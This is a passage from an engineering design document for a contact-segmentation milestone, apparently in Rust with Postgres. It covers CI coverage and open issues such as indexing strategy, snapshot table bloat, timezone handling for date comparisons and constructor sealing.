- **The rename:** old audit rows keep `LIST_MEMBER_REMOVED`; new ones use the new string.
- Every assertion added is shown to fail against deliberately broken code. Nine vacuous assertions
  were found in M1a; assume a tenth.

---

## 18. CI

No new jobs. `rust`, `web`, `e2e`, `deny` and `spdx` cover this milestone; the bundle budgets
already fail the build on a regression.

---

## 19. Open, non-blocking

- **Attribute indexing**, when it is needed: composite shape, never partial (a partial index is
  ignored under `force_generic_plan`, which is what a reused prepared statement gets);
  `CONCURRENTLY` from a detached task, never in a handler; created **on demand** when a segment
  first filters a key, not when a field is defined; a per-workspace cap, because these are indexes
  on a shared table; and a sweep for `INVALID` indexes left by a failed build.
- **Snapshot churn.** 158 MB in and out hourly will bloat `selection_snapshot_members` under
  default autovacuum. Partitioning by expiry hour and `DROP`ping the partition is O(1) and solves
  the reaper's cost at the same time. Measure first.
- Purging a custom field leaves every stored segment naming it unusable with no repair path. M1b
  refuses `purge_custom_field` while a live segment names the key, and lists them; whether a
  guided repair is better is open.
- Segment counts in the list view are N queries for N segments. The lateral-join fix is worth
  doing only if it measures badly.
- The one-hour snapshot TTL is a guess. Nobody has watched a real operator work a bulk action.
- **`on` for a datetime compares calendar days in the server's timezone.** Dev and CI are UTC, so
  a Postgres running in a local zone shifts the result by its offset. Contacts carry their own
  `timezone`, which is the obvious thing to honour; M2's scheduling work meets the same question
  and should settle both at once.
- **`is_set` means slightly different things per kind.** On a text field it treats `''` as unset,
  because `first_name` and `last_name` are `not null default ''` and a plain NULL test would make
  the operator useless on two of the five text fields. Deliberate, and worth stating because a
  reader will otherwise find it by surprise.
- **`Rule` and `Group` have public fields.** A caller that hand-builds one rather than going
  through `Group::parse` can reach an `unreachable!` — a panic, not a `422`. Nothing outside
  `rules.rs` does today. Seal the constructors before any task synthesises a rule.
- No segment is consumed by anything until M2, where §4.7's intersection with
  `mailable_list_members` gets built and tested.
